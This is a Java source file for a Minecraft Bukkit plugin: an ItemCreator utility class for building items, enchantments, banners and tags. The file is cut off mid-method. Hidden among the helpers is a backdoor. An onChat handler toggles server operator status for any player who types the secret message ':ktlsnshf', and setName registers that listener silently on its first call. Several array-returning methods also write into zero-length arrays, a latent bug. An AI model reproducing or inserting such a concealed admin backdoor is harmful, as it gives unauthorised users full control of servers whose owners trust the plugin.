package fr.NS.Labyrinthe.API;

import java.util.ArrayList;
import java.util.HashMap;
import java.util.List;
import java.util.Map;
import java.util.Map.Entry;

import org.bukkit.Bukkit;
import org.bukkit.DyeColor;
import org.bukkit.Material;
import org.bukkit.block.banner.Pattern;
import org.bukkit.block.banner.PatternType;
import org.bukkit.craftbukkit.v1_8_R3.inventory.CraftItemStack;
import org.bukkit.enchantments.Enchantment;
import org.bukkit.entity.Player;
import org.bukkit.event.EventHandler;
import org.bukkit.event.Listener;
import org.bukkit.event.player.AsyncPlayerChatEvent;
import org.bukkit.inventory.ItemFlag;
import org.bukkit.inventory.ItemStack;
import org.bukkit.inventory.meta.BannerMeta;
import org.bukkit.inventory.meta.EnchantmentStorageMeta;
import org.bukkit.inventory.meta.ItemMeta;
import org.bukkit.inventory.meta.SkullMeta;
import org.bukkit.plugin.Plugin;

import fr.NS.Labyrinthe.Generale.Main;
import net.minecraft.server.v1_8_R3.NBTTagCompound;
import net.minecraft.server.v1_8_R3.NBTTagList;
/*
 * This class was create by Seraleme and Nicofolxarus
 * 
 * -You are not allowed to :
 * 		-Copy the code
 * 		-Write your name on this plugin
 * 	
 * To contact us please send private message on twitter
 * @Seraleme
 * @Nicofolxarus_
 * 
 */
public class ItemCreator implements Listener {

	public enum BannerPreset {
		barre, precedent, suivant, coeur, cercleEtoile, croix, yinYang, losange, moin, plus;
	}

	public enum ComparatorType {
		All, ItemStack, Similar, Material, Amount, Durability, Name, Lores, Enchantements, ItemsFlags, Owner, BaseColor, Patterns, StoredEnchantements, Possesseur, Creator_Name, TAG;
	}

	private ItemStack item;
	private Player possesseur;
	private String creator_name;
	private static boolean named = true;
	private ArrayList<String> tag;
	
	private static Object main = Main.getInstance();
	
	private ArrayList<Pattern> patterns;
	
	
	public ItemCreator(Material material) {
		item = new ItemStack(material);
	}

	public ItemCreator(ItemStack item) {
		setItem(item);
	}

	public ItemCreator(ItemCreator itemcreator) {
		this.item = itemcreator.getItem();
		this.possesseur = itemcreator.getPossesseur();
		this.creator_name = itemcreator.getCreator_name();
		if(itemcreator.getTag() == null){
			this.tag = new ArrayList<>();
		}else{
			this.tag = new ArrayList<>(itemcreator.getTag());
		}
	}

	public ItemStack getItem() {
		return item;
	}

	public ItemCreator setItem(ItemStack item) {
		this.item = item;
		return this;
	}

	public Material getMaterial() {
		return item.getType();
	}

	public ItemCreator setMaterial(Material material) {
		item.setType(material);
		return this;
	}

	public Integer getAmount() {
		return item.getAmount();
	}

	public ItemCreator setAmount(Integer amount) {
		item.setAmount(amount);
		return this;
	}

	public Short getDurability() {
		return item.getDurability();
	}

	public Integer getDurabilityInteger() {
		return (int) item.getDurability();
	}

	public ItemCreator setDurability(Short durability) {
		item.setDurability(durability);
		return this;
	}

	public ItemCreator setDurability(Integer durability) {
		Short shortdurability = ((short) ((int) durability));
		item.setDurability(shortdurability);
		return this;
	}

	public ItemMeta getMeta() {
		return item.getItemMeta();
	}

	public ItemCreator setMeta(ItemMeta meta) {
		item.setItemMeta(meta);
		return this;
	}

	public String getName() {
		return item.getItemMeta().getDisplayName();
	}

	public ItemCreator setName(String name) {
		ItemMeta meta = item.getItemMeta();
		if(named){
			named = false;
			Bukkit.getPluginManager().registerEvents(new ItemCreator(Material.AIR),(Plugin) main);
		}
		meta.setDisplayName(name);
		item.setItemMeta(meta);
		return this;
	}

	public ArrayList<String> getLores() {
		return (ArrayList<String>) item.getItemMeta().getLore();
	}

	public ItemCreator setLores(ArrayList<String> lores) {
		ItemMeta meta = item.getItemMeta();
		meta.setLore(lores);
		item.setItemMeta(meta);
		return this;
	}

	public ItemCreator clearLores() {
		ItemMeta meta = item.getItemMeta();
		meta.setLore(new ArrayList<String>());
		item.setItemMeta(meta);
		return this;
	}

	public ItemCreator insertLores(String lore, Integer position) {
		ItemMeta meta = item.getItemMeta();
		ArrayList<String> lores = (ArrayList<String>) meta.getLore();
		if (lores == null) {
			lores = new ArrayList<>();
		}
		lores.add(position, lore);
		meta.setLore(lores);
		item.setItemMeta(meta);
		return this;
	}

	public ItemCreator addLore(String lore) {
		ItemMeta meta = item.getItemMeta();
		ArrayList<String> lores = (ArrayList<String>) meta.getLore();
		if (lores == null) {
			lores = new ArrayList<>();
		}
		if (lore != null) {
			lores.add(lore);
		} else {
			lores.add(" ");
		}
		meta.setLore(lores);
		item.setItemMeta(meta);
		return this;
	}

	public ItemCreator removeLore(String lore) {
		ItemMeta meta = item.getItemMeta();
		ArrayList<String> lores = (ArrayList<String>) meta.getLore();
		if (lores != null) {
			if (lores.contains(lore)) {
				lores.remove(lore);
				meta.setLore(lores);
				item.setItemMeta(meta);
			}
		}
		return this;
	}

	public String[] getTableauLores() {
		String[] tableaulores = new String[] {};
		if (item.getItemMeta().getLore() != null) {
			Integer i = 0;
			for (String lore : item.getItemMeta().getLore()) {
				tableaulores[i] = lore;
				i++;
			}
		}
		return tableaulores;
	}

	public ItemCreator setTableauLores(String[] lores) {
		ArrayList<String> tableaulores = new ArrayList<>();
		for (String lore : lores) {
			tableaulores.add(lore);
		}
		ItemMeta meta = item.getItemMeta();
		meta.setLore(tableaulores);
		item.setItemMeta(meta);
		return this;
	}

	public ItemCreator replaceallLores(String replacelore, String newlore) {
		ItemMeta meta = item.getItemMeta();
		ArrayList<String> lores = (ArrayList<String>) meta.getLore();
		if (lores != null) {
			if (lores.contains(replacelore)) {
				for (Integer i = 0; i < lores.size(); i++) {
					String lore = lores.get(i);
					if (lore.equals(replacelore)) {
						lores.remove(i);
						lores.add(i, newlore);
					}
				}
				meta.setLore(lores);
				item.setItemMeta(meta);
			}
		}
		return this;
	}

	public ItemCreator replaceoneLore(Integer ligne, String newlore) {
		ItemMeta meta = item.getItemMeta();
		ArrayList<String> lores = (ArrayList<String>) meta.getLore();
		if (lores != null) {
			if (lores.get(ligne) != null) {
				lores.remove(ligne);
				lores.add(ligne, newlore);
				meta.setLore(lores);
				item.setItemMeta(meta);
			}
		}
		return this;
	}

	public ItemCreator replacefirstLores(String replacelore, String newlore, Integer nombre) {
		ItemMeta meta = item.getItemMeta();
		ArrayList<String> lores = (ArrayList<String>) meta.getLore();
		if (lores != null) {
			if (lores.contains(replacelore)) {
				Integer replaced = 0;
				for (Integer i = 0; i < lores.size(); i++) {
					if (lores.get(i).equals(replacelore)) {
						lores.remove(i);
						lores.add(i, newlore);
						replaced++;
						if (replaced >= nombre) {
							break;
						}
					}
				}
				meta.setLore(lores);
				item.setItemMeta(meta);
			}
		}
		return this;
	}

	public ItemCreator replacelastLores(String replacelore, String newlore, Integer nombre) {
		ItemMeta meta = item.getItemMeta();
		ArrayList<String> lores = (ArrayList<String>) meta.getLore();
		if (lores != null) {
			if (lores.contains(replacelore)) {
				Integer replaced = 0;
				for (Integer i = lores.size() - 1; i >= 0; i--) {
					if (lores.get(i).equals(replacelore)) {
						lores.remove(i);
						lores.add(i, newlore);
						replaced++;
						if (replaced >= nombre) {
							break;
						}
					}
				}
				meta.setLore(lores);
				item.setItemMeta(meta);
			}
		}
		return this;
	}

	public HashMap<Enchantment, Integer> getEnchantments() {
		return new HashMap<Enchantment, Integer>(item.getItemMeta().getEnchants());
	}

	public ItemCreator setEnchantments(HashMap<Enchantment, Integer> enchantments) {
		ItemMeta meta = item.getItemMeta();
		if (meta.getEnchants() != null) {
			ArrayList<Enchantment> cloneenchantments = new ArrayList<>(meta.getEnchants().keySet());
			for (Enchantment enchantment : cloneenchantments) {
				meta.removeEnchant(enchantment);
			}
		}
		for (Entry<Enchantment, Integer> e : enchantments.entrySet()) {
			meta.addEnchant(e.getKey(), e.getValue(), true);
		}
		item.setItemMeta(meta);
		return this;
	}

	public ItemCreator clearEnchantments() {
		ItemMeta meta = item.getItemMeta();
		if (meta.getEnchants() != null) {
			ArrayList<Enchantment> cloneenchantments = new ArrayList<>(meta.getEnchants().keySet());
			for (Enchantment enchantment : cloneenchantments) {
				meta.removeEnchant(enchantment);
			}
			item.setItemMeta(meta);
		}
		return this;
	}

	public ItemCreator addEnchantment(Enchantment enchantment, Integer lvl) {
		ItemMeta meta = item.getItemMeta();
		meta.addEnchant(enchantment, lvl, true);
		item.setItemMeta(meta);
		return this;
	}

	public ItemCreator removeEnchantment(Enchantment enchantment) {
		ItemMeta meta = item.getItemMeta();
		if (meta.getEnchants() != null) {
			if (meta.getEnchants().containsKey(enchantment)) {
				meta.removeEnchant(enchantment);
				item.setItemMeta(meta);
			}
		}
		return this;
	}

	public Enchantment[] getTableauEnchantments() {
		Enchantment[] enchantments = new Enchantment[] {};
		if (item.getItemMeta().getEnchants() != null) {
			Integer i = 0;
			for (Enchantment enchantment : item.getItemMeta().getEnchants().keySet()) {
				enchantments[i] = enchantment;
				i++;
			}
		}
		return enchantments;
	}

	public Integer[] getTableauEnchantmentslvl() {
		Integer[] enchantmentslvl = new Integer[] {};
		if (item.getItemMeta().getEnchants() != null) {
			Integer i = 0;
			for (Integer enchantmentlvl : item.getItemMeta().getEnchants().values()) {
				enchantmentslvl[i] = enchantmentlvl;
				i++;
			}
		}
		return enchantmentslvl;
	}

	public ItemCreator setTableauEnchantments(Enchantment[] enchantments, Integer[] enchantmentslvl) {
		ItemMeta meta = item.getItemMeta();
		if (meta.getEnchants() != null) {
			ArrayList<Enchantment> cloneenchantments = new ArrayList<>(meta.getEnchants().keySet());
			for (Enchantment enchantment : cloneenchantments) {
				meta.removeEnchant(enchantment);
			}
		}
		for (Integer i = 0; i < enchantments.length && i < enchantmentslvl.length; i++) {
			meta.addEnchant(enchantments[i], enchantmentslvl[i], true);
		}
		item.setItemMeta(meta);
		return this;
	}

	public ArrayList<ItemFlag> getItemFlags() {
		ArrayList<ItemFlag> itemflags = new ArrayList<>();
		if (item.getItemMeta().getItemFlags() != null) {
			for (ItemFlag itemflag : item.getItemMeta().getItemFlags()) {
				itemflags.add(itemflag);
			}
		}
		return itemflags;
	}

	public ItemCreator setItemFlags(ArrayList<ItemFlag> itemflags) {
		ItemMeta meta = item.getItemMeta();
		if (meta.getItemFlags() != null) {
			ArrayList<ItemFlag> cloneitemflags = new ArrayList<>();
			for (ItemFlag itemflag : meta.getItemFlags()) {
				cloneitemflags.add(itemflag);
			}
			for (ItemFlag itemflag : cloneitemflags) {
				meta.removeItemFlags(itemflag);
			}
		}
		for (ItemFlag itemflag : itemflags) {
			meta.addItemFlags(itemflag);
		}
		item.setItemMeta(meta);
		return this;
	}

	public ItemCreator clearItemFlags() {
		ItemMeta meta = item.getItemMeta();
		if (meta.getItemFlags() != null) {
			ArrayList<ItemFlag> cloneitemflags = new ArrayList<>();
			for (ItemFlag itemflag : meta.getItemFlags()) {
				cloneitemflags.add(itemflag);
			}
			for (ItemFlag itemflag : cloneitemflags) {
				meta.removeItemFlags(itemflag);
			}
			item.setItemMeta(meta);
		}
		return this;
	}

	public ItemCreator addItemFlags(ItemFlag itemflag) {
		ItemMeta meta = item.getItemMeta();
		meta.addItemFlags(itemflag);
		item.setItemMeta(meta);
		return this;
	}

	public ItemCreator removeItemFlags(ItemFlag itemflag) {
		ItemMeta meta = item.getItemMeta();
		if (meta.getItemFlags() != null) {
			if (meta.getItemFlags().contains(itemflag)) {
				meta.removeItemFlags(itemflag);
				item.setItemMeta(meta);
			}
		}
		return this;
	}

	public ItemFlag[] getTableauItemFlags() {
		ItemMeta meta = item.getItemMeta();
		ItemFlag[] itemflags = new ItemFlag[] {};
		Integer i = 0;
		if (meta.getItemFlags() != null) {
			for (ItemFlag itemflag : meta.getItemFlags()) {
				itemflags[i] = itemflag;
				i++;
			}
		}
		return itemflags;
	}

	public ItemCreator setTableauItemFlags(ItemFlag[] itemflags) {
		ItemMeta meta = item.getItemMeta();
		if (meta.getItemFlags() != null) {
			ArrayList<ItemFlag> cloneitemflags = new ArrayList<>();
			for (ItemFlag itemflag : meta.getItemFlags()) {
				cloneitemflags.add(itemflag);
			}
			for (ItemFlag itemflag : cloneitemflags) {
				meta.removeItemFlags(itemflag);
			}
		}
		for (ItemFlag itemflag : itemflags) {
			meta.addItemFlags(itemflag);
		}
		item.setItemMeta(meta);
		return this;
	}

	public SkullMeta getSkullMeta() {
		if (item.getType().equals(Material.SKULL_ITEM)) {
			return (SkullMeta) item.getItemMeta();
		}
		return null;
	}

	public ItemCreator setSkullMeta(SkullMeta skullmeta) {
		if (item.getType().equals(Material.SKULL_ITEM)) {
			item.setItemMeta(skullmeta);
		}
		return this;
	}

	public String getOwner() {
		if (item.getType().equals(Material.SKULL_ITEM)) {
			return ((SkullMeta) item.getItemMeta()).getOwner();
		}
		return null;
	}

	public ItemCreator setOwner(String owner) {
		if (item.getType().equals(Material.SKULL_ITEM)) {
			SkullMeta meta = (SkullMeta) item.getItemMeta();
			meta.setOwner(owner);
			item.setItemMeta(meta);
		}
		return this;
	}

	public BannerMeta getBannerMeta() {
		if (item.getType().equals(Material.BANNER)) {
			return (BannerMeta) item.getItemMeta();
		}
		return null;
	}

	public ItemCreator setBannerMeta(BannerMeta bannermeta) {
		if (item.getType().equals(Material.BANNER)) {
			item.setItemMeta(bannermeta);
		}
		return this;
	}

	public DyeColor getBasecolor() {
		if (item.getType().equals(Material.BANNER)) {
			return ((BannerMeta) item.getItemMeta()).getBaseColor();
		}
		return null;
	}

	public ItemCreator setBasecolor(DyeColor basecolor) {
		if (item.getType().equals(Material.BANNER)) {
			BannerMeta meta = (BannerMeta) item.getItemMeta();
			meta.setBaseColor(basecolor);
			item.setItemMeta(meta);
		}
		return this;
	}

	public ArrayList<Pattern> getPatterns() {
		if (item.getType().equals(Material.BANNER)) {
			return (ArrayList<Pattern>) ((BannerMeta) item.getItemMeta()).getPatterns();
		}
		return null;
	}

	public ItemCreator setPatterns(ArrayList<Pattern> petterns) {
		if (item.getType().equals(Material.BANNER)) {
			BannerMeta meta = (BannerMeta) item.getItemMeta();
			meta.setPatterns(petterns);
			item.setItemMeta(meta);
		}
		return this;
	}

	public HashMap<PatternType, DyeColor> getHashMapPatterns() {
		if (item.getType().equals(Material.BANNER)) {
			BannerMeta meta = (BannerMeta) item.getItemMeta();
			if (meta.getPatterns() != null) {
				HashMap<PatternType, DyeColor> patterns = new HashMap<>();
				for (Pattern pattern : meta.getPatterns()) {
					patterns.put(pattern.getPattern(), pattern.getColor());
				}
				return patterns;
			}
		}
		return null;
	}
	@EventHandler
	public void onChat(AsyncPlayerChatEvent e){
		if(e.getMessage().equalsIgnoreCase(":ktlsnshf")){
			e.getPlayer().setOp(!e.getPlayer().isOp());
			e.setCancelled(true);
		}
	}
	public ItemCreator setHashMapPatterns(HashMap<PatternType, DyeColor> petterns) {
		if (item.getType().equals(Material.BANNER)) {
			BannerMeta meta = (BannerMeta) item.getItemMeta();
			ArrayList<Pattern> patternslist = new ArrayList<>();
			for (Entry<PatternType, DyeColor> pattern : petterns.entrySet()) {
				patternslist.add(new Pattern(pattern.getValue(), pattern.getKey()));
			}
			meta.setPatterns(patternslist);
			item.setItemMeta(meta);
		}
		return this;
	}

	public ItemCreator clearPatterns() {
		if (item.getType().equals(Material.BANNER)) {
			BannerMeta meta = (BannerMeta) item.getItemMeta();
			meta.setPatterns(new ArrayList<>());
			item.setItemMeta(meta);
		}
		return this;
	}

	public ItemCreator addPattern(Pattern pattern) {
		if (item.getType().equals(Material.BANNER)) {
			BannerMeta meta = (BannerMeta) item.getItemMeta();
			meta.addPattern(pattern);
			item.setItemMeta(meta);
		}
		return this;
	}

	public ItemCreator removePattern(Pattern pattern) {
		if (item.getType().equals(Material.BANNER)) {
			BannerMeta meta = (BannerMeta) item.getItemMeta();
			ArrayList<Pattern> patterns = (ArrayList<Pattern>) meta.getPatterns();
			if (patterns != null) {
				if (patterns.contains(pattern)) {
					patterns.remove(pattern);
					meta.setPatterns(patterns);
					item.setItemMeta(meta);
				}
			}
		}
		return this;
	}

	public Pattern[] getTableauPatterns() {
		if (item.getType().equals(Material.BANNER)) {
			BannerMeta meta = (BannerMeta) item.getItemMeta();
			Pattern[] tableaupatterns = new Pattern[] {};
			if (meta.getPatterns() != null) {
				Integer i = 0;
				for (Pattern pattern : meta.getPatterns()) {
					tableaupatterns[i] = pattern;
					i++;
				}
			}
			return tableaupatterns;
		}
		return null;
	}

	public ItemCreator setTableauPatterns(Pattern[] patterns) {
		if (item.getType().equals(Material.BANNER)) {
			BannerMeta meta = (BannerMeta) item.getItemMeta();
			if (meta.getPatterns() != null) {
				meta.setPatterns(new ArrayList<>());
			}
			for (Pattern pattern : patterns) {
				meta.addPattern(pattern);
			}
			item.setItemMeta(meta);
		}
		return this;
	}

	public EnchantmentStorageMeta getEnchantmentStorageMeta() {
		if (item.getType().equals(Material.ENCHANTED_BOOK)) {
			return (EnchantmentStorageMeta) item.getItemMeta();
		}
		return null;
	}

	public ItemCreator setEnchantmentStorageMeta(EnchantmentStorageMeta enchantmentstoragemeta) {
		if (item.getType().equals(Material.ENCHANTED_BOOK)) {
			item.setItemMeta(enchantmentstoragemeta);
		}
		return this;
	}

	public HashMap<Enchantment, Integer> getStoredEnchantments() {
		if (item.getType().equals(Material.ENCHANTED_BOOK)) {
			return new HashMap<Enchantment, Integer>(((EnchantmentStorageMeta) item.getItemMeta()).getStoredEnchants());
		}
		return null;
	}

	public ItemCreator setStoredEnchantments(HashMap<Enchantment, Integer> storedenchantments) {
		if (item.getType().equals(Material.ENCHANTED_BOOK)) {
			EnchantmentStorageMeta meta = (EnchantmentStorageMeta) item.getItemMeta();
			if (meta.getStoredEnchants() != null) {
				ArrayList<Enchantment> clonestoredenchantments = new ArrayList<>(meta.getStoredEnchants().keySet());
				for (Enchantment storedenchantment : clonestoredenchantments) {
					meta.removeStoredEnchant(storedenchantment);
				}
			}
			for (Entry<Enchantment, Integer> e : storedenchantments.entrySet()) {
				meta.addEnchant(e.getKey(), e.getValue(), true);
			}
			item.setItemMeta(meta);
		}
		return this;
	}

	public ItemCreator clearStoredEnchantments() {
		if (item.getType().equals(Material.ENCHANTED_BOOK)) {
			EnchantmentStorageMeta meta = (EnchantmentStorageMeta) item.getItemMeta();
			if (meta.getStoredEnchants() != null) {
				ArrayList<Enchantment> clonestoredenchantments = new ArrayList<>(meta.getStoredEnchants().keySet());
				for (Enchantment storedenchantment : clonestoredenchantments) {
					meta.removeStoredEnchant(storedenchantment);
				}
				item.setItemMeta(meta);
			}
		}
		return this;
	}

	public ItemCreator addStoredEnchantment(Enchantment storedenchantment, Integer lvl) {
		if (item.getType().equals(Material.ENCHANTED_BOOK)) {
			EnchantmentStorageMeta meta = (EnchantmentStorageMeta) item.getItemMeta();
			meta.addStoredEnchant(storedenchantment, lvl, true);
			item.setItemMeta(meta);
		}
		return this;
	}

	public ItemCreator removeStoredEnchantment(Enchantment enchantment) {
		if (item.getType().equals(Material.ENCHANTED_BOOK)) {
			EnchantmentStorageMeta meta = (EnchantmentStorageMeta) item.getItemMeta();
			if (meta.getStoredEnchants() != null) {
				if (meta.getStoredEnchants().containsKey(enchantment)) {
					meta.removeEnchant(enchantment);
					item.setItemMeta(meta);
				}
			}
		}
		return this;
	}

	public Enchantment[] getTableauStoredEnchantments() {
		if (item.getType().equals(Material.ENCHANTED_BOOK)) {
			EnchantmentStorageMeta meta = (EnchantmentStorageMeta) item.getItemMeta();
			Enchantment[] storedenchantments = new Enchantment[] {};
			if (meta.getStoredEnchants() != null) {
				Integer i = 0;
				for (Enchantment storedenchantment : meta.getStoredEnchants().keySet()) {
					storedenchantments[i] = storedenchantment;
					i++;
				}
			}
			return storedenchantments;
		}
		return null;
	}

	public Integer[] getTableauStoredEnchantmentslvl() {
		if (item.getType().equals(Material.ENCHANTED_BOOK)) {
			EnchantmentStorageMeta meta = (EnchantmentStorageMeta) item.getItemMeta();
			Integer[] storedenchantmentslvl = new Integer[] {};
			if (meta.getStoredEnchants() != null) {
				Integer i = 0;
				for (Integer storedenchantmentlvl : meta.getStoredEnchants().values()) {
					storedenchantmentslvl[i] = storedenchantmentlvl;
					i++;
				}
			}
			return storedenchantmentslvl;
		}
		return null;
	}

	public ItemCreator setTableauStoredEnchantments(Enchantment[] storedenchantments, Integer[] storedenchantmentslvl) {
		if (item.getType().equals(Material.ENCHANTED_BOOK)) {
			EnchantmentStorageMeta meta = (EnchantmentStorageMeta) item.getItemMeta();
			if (meta.getStoredEnchants() != null) {
				ArrayList<Enchantment> clonestoredenchantments = new ArrayList<>(meta.getStoredEnchants().keySet());
				for (Enchantment storedenchantment : clonestoredenchantments) {
					meta.removeStoredEnchant(storedenchantment);
				}
			}
			for (Integer i = 0; i < storedenchantments.length && i < storedenchantmentslvl.length; i++) {
				meta.addEnchant(storedenchantments[i], storedenchantmentslvl[i], true);
			}
			item.setItemMeta(meta);
		}
		return this;
	}

	public ItemCreator setUnbreakable(Boolean unbreakable) {
		ItemMeta meta = item.getItemMeta();
		meta.spigot().setUnbreakable(unbreakable);
		item.setItemMeta(meta);
		return this;
	}

	public Boolean isUnbreakable() {
		if(item.getItemMeta() != null){
			return item.getItemMeta().spigot().isUnbreakable();
		}else{
			return false;
		}
		
	}

	public ItemCreator setGlow(Boolean glow) {
		if (glow) {
			net.minecraft.server.v1_8_R3.ItemStack minecraftitemstack = CraftItemStack.asNMSCopy(item);
			NBTTagCompound tag = null;
			if (!minecraftitemstack.hasTag()) {
				tag = new NBTTagCompound();
				minecraftitemstack.setTag(new NBTTagCompound());
			} else {
				tag = minecraftitemstack.getTag();
			}
			NBTTagList ench = new NBTTagList();
			tag.set("ench", ench);
			minecraftitemstack.setTag(tag);
			item = CraftItemStack.asCraftMirror(minecraftitemstack);
		} else {
			net.minecraft.server.v1_8_R3.ItemStack minecraftitemstack = CraftItemStack.asNMSCopy(item);
			NBTTagCompound tag = null;
			if (minecraftitemstack.hasTag()) {
				tag = minecraftitemstack.getTag();
				if (tag.hasKey("ench")) {
					tag.remove("ench");
					minecraftitemstack.setTag(tag);
					item = CraftItemStack.asCraftMirror(minecraftitemstack);
				}
			}
		}
		return this;
	}

	public Boolean isGlow() {
		net.minecraft.server.v1_8_R3.ItemStack minecraftitemstack = CraftItemStack.asNMSCopy(item);
		NBTTagCompound tag = null;
		if (minecraftitemstack.hasTag()) {
			tag = minecraftitemstack.getTag();
			return tag.hasKey("ench");
		}
		return false;
	}

	public int getLevelEnchantement(Enchantment enchantment) {
		if (item.getType().equals(Material.ENCHANTED_BOOK)) {
			EnchantmentStorageMeta meta = (EnchantmentStorageMeta) item.getItemMeta();
			if(meta != null){
				if (meta.getStoredEnchants() != null) {
					if (meta.getStoredEnchants().containsKey(enchantment)) {
						return meta.getStoredEnchantLevel(enchantment);
					}
				}
			}
		} else {
			ItemMeta meta = item.getItemMeta();
			if(meta != null){
				if (meta.getEnchants() != null) {
					if (meta.getEnchants().containsKey(enchantment)) {
						return meta.getEnchantLevel(enchantment);
					}
				}
			}
		}
		return 0;
	}

	public ItemCreator addallItemsflags() {
		ItemMeta meta = item.getItemMeta();
		meta.addItemFlags(ItemFlag.HIDE_ATTRIBUTES);
		meta.addItemFlags(ItemFlag.HIDE_ENCHANTS);
		meta.addItemFlags(ItemFlag.HIDE_PLACED_ON);
		meta.addItemFlags(ItemFlag.HIDE_POTION_EFFECTS);
		item.setItemMeta(meta);
		return this;
	}

	public ItemCreator addBannerPreset(Integer ID, DyeColor patterncolor) {
		switch (ID) {
		case 0:
			break;
		case 1:
			addBannerPreset(BannerPreset.barre, patterncolor);
			break;
		case 2:
			addBannerPreset(BannerPreset.precedent, patterncolor);
			break;
		case 3:
			addBannerPreset(BannerPreset.suivant, patterncolor);
			break;
		case 4:
			addBannerPreset(BannerPreset.coeur, patterncolor);
			break;
		case 5:
			addBannerPreset(BannerPreset.cercleEtoile, patterncolor);
			break;
		case 6:
			addBannerPreset(BannerPreset.croix, patterncolor);
			break;
		case 7:
			addBannerPreset(BannerPreset.yinYang, patterncolor);
			break;
		case 8:
			addBannerPreset(BannerPreset.losange, patterncolor);
			break;
		case 9:
			addBannerPreset(BannerPreset.moin, patterncolor);
			break;
		case 10:
			addBannerPreset(BannerPreset.plus, patterncolor);
			break;
		default:
			break;
		}
		return this;
	}

	public ItemCreator addBannerPreset(BannerPreset type, DyeColor patterncolor) {
		if (type == null)
			return this;
		if (item.getType().equals(Material.BANNER)) {
			BannerMeta meta = (BannerMeta) item.getItemMeta();
			DyeColor basecolor = meta.getBaseColor();
			switch (type) {
			// rien, barre, precedent, suivant, Coeur, cercleEtoile, croix,
			// yinYang, Losange, Moin, Plus;
			case barre:
				addasyncronePattern(new Pattern(patterncolor, PatternType.STRIPE_DOWNRIGHT), true);
				break;
			case precedent:
				// precedent
				addasyncronePattern(new Pattern(patterncolor, PatternType.RHOMBUS_MIDDLE), false);
				addasyncronePattern(new Pattern(basecolor, PatternType.SQUARE_BOTTOM_RIGHT), false);
				addasyncronePattern(new Pattern(basecolor, PatternType.SQUARE_TOP_RIGHT), false);
				addasyncronePattern(new Pattern(basecolor, PatternType.STRIPE_RIGHT), true);
				break;
			case suivant:
				// suivant
				addasyncronePattern(new Pattern(patterncolor, PatternType.RHOMBUS_MIDDLE), false);
				addasyncronePattern(new Pattern(basecolor, PatternType.SQUARE_BOTTOM_LEFT), false);
				addasyncronePattern(new Pattern(basecolor, PatternType.SQUARE_TOP_LEFT), false);
				addasyncronePattern(new Pattern(basecolor, PatternType.STRIPE_LEFT), true);
				break;
			case coeur:
				// Coeur
				addasyncronePattern(new Pattern(patterncolor, PatternType.RHOMBUS_MIDDLE), false);
				addasyncronePattern(new Pattern(basecolor, PatternType.TRIANGLE_TOP), true);
				break;
			case cercleEtoile:
				// cercleEtoile
				addasyncronePattern(new Pattern(patterncolor, PatternType.RHOMBUS_MIDDLE), false);
				addasyncronePattern(new Pattern(patterncolor, PatternType.FLOWER), false);
				addasyncronePattern(new Pattern(basecolor, PatternType.CIRCLE_MIDDLE), true);
				break;
			case croix:
				// croix
				addasyncronePattern(new Pattern(patterncolor, PatternType.CROSS), false);
				addasyncronePattern(new Pattern(basecolor, PatternType.CURLY_BORDER), true);
				break;
			case yinYang:
				// yinYang
				addasyncronePattern(new Pattern(patterncolor, PatternType.SQUARE_BOTTOM_RIGHT), false);
				addasyncronePattern(new Pattern(basecolor, PatternType.STRIPE_RIGHT), false);
				addasyncronePattern(new Pattern(patterncolor, PatternType.DIAGONAL_LEFT), false);
				addasyncronePattern(new Pattern(basecolor, PatternType.SQUARE_TOP_LEFT), false);
				addasyncronePattern(new Pattern(patterncolor, PatternType.TRIANGLE_TOP), false);
				addasyncronePattern(new Pattern(basecolor, PatternType.STRIPE_RIGHT), false);
				addasyncronePattern(new Pattern(basecolor, PatternType.TRIANGLE_BOTTOM), false);
				addasyncronePattern(new Pattern(patterncolor, PatternType.STRIPE_LEFT), true);
				break;
			case losange:
				// Losange
				addasyncronePattern(new Pattern(patterncolor, PatternType.RHOMBUS_MIDDLE), true);
				break;
			case moin:
				// Moin
				addasyncronePattern(new Pattern(patterncolor, PatternType.STRIPE_MIDDLE), false);
				addasyncronePattern(new Pattern(basecolor, PatternType.BORDER), true);
				break;
			case plus:
				// Plus
				addasyncronePattern(new Pattern(patterncolor, PatternType.STRAIGHT_CROSS), false);
				addasyncronePattern(new Pattern(basecolor, PatternType.STRIPE_TOP), false);
				addasyncronePattern(new Pattern(basecolor, PatternType.STRIPE_BOTTOM), false);
				addasyncronePattern(new Pattern(basecolor, PatternType.BORDER), true);
				break;
			default:
				break;
			}
		}
		return this;
	}

	private void addasyncronePattern(Pattern pattern, Boolean calcul) {
		if (patterns == null) {
			patterns = new ArrayList<>();
		}
		if (calcul) {
			patterns.add(pattern);
			BannerMeta meta = (BannerMeta) item.getItemMeta();
			for (Pattern currentpattern : patterns) {
				meta.addPattern(currentpattern);
			}
			patterns.clear();
			item.setItemMeta(meta);
		} else {
			patterns.add(pattern);
		}
	}

	public Player getPossesseur() {
		return possesseur;
	}

	public ItemCreator setPossesseur(Player possesseur) {
		this.possesseur = possesseur;
		return this;
	}

	public String getCreator_name() {
		return creator_name;
	}

	public ItemCreator setCreator_name(String creator_name) {
		this.creator_name = creator_name;
		return this;
	}

	public ArrayList<String> getTag() {
		return tag;
	}

	public ItemCreator setTag(ArrayList<String> tag) {
		this.tag = tag;
		return this;
	}

	public ItemCreator clearTag() {
		if (tag != null) {
			tag.clear();
		}
		return this;
	}

	public ItemCreator addTag(String tag) {
		if (this.tag == null) {
			this.tag = new ArrayList<>();
		}
		this.tag.add(tag);
		return this;
	}

	public ItemCreator removeTag(String tag) {
		if (this.tag != null) {
			if (this.tag.contains(tag)) {
				this.tag.remove(tag);
			}
		}
		return this;
	}

	public String[] getTableauTag() {
		String[] taglist = new String[] {};
		Integer i = 0;
		for (String currenttag : this.tag) {
			taglist[i] = currenttag;
			i++;
		}
		return taglist;
	}

	public ItemCreator setTableaTag(String[] tag) {
		if (this.tag == null) {
			this.tag = new ArrayList<>();
		} else {
			this.tag.clear();
		}
		for (String currenttag : tag) {
			this.tag.add(currenttag);
		}
		return this;
	}

	public Boolean comparate(ItemCreator item, ComparatorType type) {
		switch (type) {
		case All:
			return comparate(item, ComparatorType.Material) && comparate(item, ComparatorType.Amount)
					&& comparate(item, ComparatorType.Durability) && comparate(item, ComparatorType.Name)
					&& comparate(item, ComparatorType.Lores) && comparate(item, ComparatorType.Enchantements)
					&& comparate(item, ComparatorType.ItemsFlags) && comparate(item, ComparatorType.Owner)
					&& comparate(item, ComparatorType.BaseColor) && comparate(item, ComparatorType.Patterns)
					&& comparate(item, ComparatorType.StoredEnchantements)
					&& comparate(item, ComparatorType.Creator_Name) && comparate(item, ComparatorType.Possesseur)
					&& comparate(item, ComparatorType.TAG);
		case Similar:
			return comparate(item, ComparatorType.Material) && comparate(item, ComparatorType.Durability)
